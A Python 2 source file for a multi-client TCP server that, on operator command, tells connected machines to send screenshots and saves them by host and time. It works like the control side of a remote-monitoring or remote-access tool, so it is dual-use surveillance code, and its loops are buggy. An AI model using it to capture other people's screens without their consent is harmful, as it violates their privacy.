#!/usr/bin/env python2
import socket, datetime, os, select, sys
from threading import Thread

PORT = 9005

class Server(Thread):

    def __init__(self, port=PORT):
        Thread.__init__(self)
        self.port=port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conns = []
        self.shutdown_bool = False

    def run(self):
        self.sock.bind(('', self.port))
        self.sock.listen(40)
        while True:
            if not self.shutdown_bool:
                c = Connection(len(self.conns), *self.sock.accept())
                c.start()
                self.conns.append(c)
            else:
                self.sock.close()
                break

    def close_conn(self, id_client):
        self.conns[id_client].close_conn()

    def getscreen(self, id_client):
        self.conns[id_client].getscreen_bool = True

    def shutdown_serv(self):
        self.shutdown_bool = True

class Connection(Thread):

    def __init__(self, id_client, sock, addr):
        Thread.__init__(self)
        self.sock = sock
        self.addr = addr
        self.id_client = id_client
        self.host = socket.gethostbyaddr(self.addr[0])[0]
        self.getscreen_bool = False
        self.disconnect_bool = False
        print("\n%s connected" % self.host)

    def run(self):
        while True:
            if self.getscreen_bool:
                self.recievefile()
            if self.disconnect_bool:
                self.close_conn()
                break

    def recievefile(self):
        self.getscreen_bool = False
        self.sock.sendall('getscreen')
        while True:
            filesize = self.sock.recv(1024)
            self.sock.send(filesize)
            filesize = int(filesize)
            now = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
            folder = '%s (%s)' % (self.host, self.addr[0])
            filepath = '%s/%s, %s.png' % (folder, self.addr[0], now)
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open(filepath, 'wb+') as image:
                recvsize = 0
                while recvsize<filesize:
                    data = self.sock.recv(1024)
                    image.write(data)
                    recvsize += len(data)
            print(filepath)
    
    def close_conn(self):
        self.sock.sendall('disconnect')

    def getinfo(self):
        return "Client ID: %d Host: %s IP: %s" % \
                (self.id_client, self.host, self.addr)

if __name__ == '__main__':

    serv = Server()
    serv.start()

    print("Options: getscreen [g] and disconnect [d] quit [q]\n")
    while True:
        cmd = raw_input("Type command: ")
        if cmd == 's' or cmd == 'showclients':
            for conn in serv.conns:
                if conn.is_alive():
                    print(conn.getinfo())

        elif cmd == 'd' or cmd == 'disconnect':
            if serv.conns:
                id_client = int(raw_input('Type client ID: '))
                serv.close_conn(id_client)
            else:
                print("No clients connected")

        elif cmd == 'g' or cmd == 'getscreen':
            if serv.conns:
                id_client = int(raw_input('Type client ID: '))
                serv.getscreen(id_client)
            else:
                print("No clients connected")

        elif cmd == 'q' or cmd == 'quit':
            conns = [elem for elem in serv.conns if elem.isAlive()]
            for conn in conns:
                conn.close_conn()
            serv.shutdown_serv()
            sys.exit()
        
        else: print("Bad command")
